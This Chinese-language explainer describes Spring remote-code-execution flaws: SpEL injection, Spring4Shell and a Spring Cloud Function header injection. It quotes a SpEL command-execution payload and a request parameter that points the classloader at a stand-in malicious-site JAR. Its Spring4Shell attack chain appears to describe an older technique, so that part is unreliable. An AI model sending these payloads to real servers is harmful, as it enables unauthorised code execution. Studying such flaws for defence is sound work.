### 讲下 Spring 相关的 RCE 原理

**1. Spring Expression Language (SpEL) 注入**

**原理**： SpEL 是一种强大的表达式语言，类似于 OGNL，用于在运行时动态地评估和执行表达式。它的强大之处在于，可以调用 Java 类、方法，甚至是系统命令。如果应用程序在处理用户输入时，直接将未经验证的输入作为 SpEL 表达式来解析，就会导致 SpEL 注入漏洞

**攻击链**：

1. **用户输入**：攻击者在 HTTP 请求中发送一个恶意的 SpEL 表达式，例如： `T(java.lang.Runtime).getRuntime().exec("whoami")`
2. **Spring 解析**：应用程序的代码将这个输入作为 SpEL 表达式传递给 `SpELParser`
3. **表达式执行**：SpEL 解释器会解析并执行这个表达式
4. **远程代码执行**：`T(java.lang.Runtime).getRuntime().exec("whoami")` 这段代码会通过反射调用 `java.lang.Runtime` 类的静态方法 `getRuntime()`，然后调用 `exec()` 方法来执行系统命令，从而实现 RCE

**典型场景**：

- **Spring Boot Actuator**：在旧版本的 Spring Boot 中，Actuator 的某些接口（如 `/env` 或 `/refresh`）在配置不当时，可以被利用来执行 SpEL 表达式，从而触发 RCE

**2. Spring Framework 数据绑定漏洞 (CVE-2022-22965)**

**原理**： 这个漏洞被称为“**Spring4Shell**”，它利用了 Spring MVC 的**数据绑定**功能。当一个 HTTP 请求被绑定到一个 Java 对象时，Spring 会尝试将请求参数的值设置到对象的属性上。攻击者可以利用这个机制，通过构造恶意的请求参数，来访问和修改一些特殊的、不应该被访问的类属性

**攻击链**：

1. **用户输入**：攻击者构造一个恶意的 HTTP 请求，其参数名为：`class.module.classLoader.URLs[0]=http://malicious-site/evil.jar`
2. **数据绑定**：Spring 将这个参数绑定到一个 Java 对象
3. **ClassLoader 修改**：Spring 的数据绑定机制会解析这个参数，并最终修改**应用程序的类加载器（ClassLoader）**
4. **加载恶意代码**：一旦类加载器被修改，攻击者就可以通过其他请求，让应用程序去加载一个远程的恶意 JAR 包，从而在服务器上执行恶意代码

**影响**：

- 这个漏洞的危害性极高，因为它影响了 Spring Framework 5.2 及 5.3 版本的核心数据绑定功能。攻击者无需认证即可利用

**3. Spring Cloud Function SpEL 注入 (CVE-2022-22963)**

**原理**： 这个漏洞是另一个 SpEL 注入的例子，但它存在于 **Spring Cloud Function** 库中。这个库允许开发者使用函数式编程来处理请求。当通过 Spring Cloud Function 路由请求时，如果路由头（`spring.cloud.function.routing-expression`）被设置，它的值就会被当作 SpEL 表达式来执行

**攻击链**：

1. **用户输入**：攻击者在 HTTP 请求的 Header 中添加一个名为 `spring.cloud.function.routing-expression` 的头，其值为一个恶意的 SpEL 表达式，例如：`T(java.lang.Runtime).getRuntime().exec("whoami")`
2. **函数路由**：Spring Cloud Function 在处理请求时，会获取这个头的值
3. **表达式执行**：它会直接将这个值作为 SpEL 表达式来执行，导致 RCE

**影响**：

- 这个漏洞的利用非常简单，只需要一个 HTTP 请求头即可。它影响了 Spring Cloud Function 3.1.6 和 3.2.2 等版本，危害同样很高